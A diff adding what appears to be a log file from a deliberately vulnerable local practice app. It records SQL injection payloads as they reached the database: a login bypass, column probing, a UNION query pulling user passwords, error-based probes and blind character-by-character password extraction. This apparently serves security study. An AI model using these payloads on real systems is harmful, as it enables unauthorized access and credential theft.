@@ -1,0 +1,9 @@
+Vulnerable app listening on http://localhost:3001
+[VULNERABLE QUERY] SELECT id, username, role FROM users WHERE username = 'admin' AND password = 'wrongpass'
+[VULNERABLE QUERY] SELECT id, username, role FROM users WHERE username = 'admin' OR '1'='1' -- -' AND password = 'anything'
+[VULNERABLE QUERY] SELECT id, name, category, price FROM products WHERE name LIKE '%nonexistent' ORDER BY 5 -- -%'
+[VULNERABLE QUERY] SELECT id, name, category, price FROM products WHERE name LIKE '%nonexistent' UNION SELECT id, username, password, 1 FROM users -- -%'
+[VULNERABLE QUERY] SELECT id, name, category, price FROM products WHERE name LIKE '%nonexistent' AND 1=(SELECT 1 FROM users_typo) -- -%'
+[VULNERABLE QUERY] SELECT id, name, category, price FROM products WHERE name LIKE '%nonexistent' AND 1=(SELECT 1 FROM users WHERE passwordx='x') -- -%'
+[VULNERABLE QUERY] SELECT id, name, category, price FROM products WHERE name LIKE '%zzznoproduct' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='S' -- -%'
+[VULNERABLE QUERY] SELECT id, name, category, price FROM products WHERE name LIKE '%zzznoproduct' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='X' -- -%'
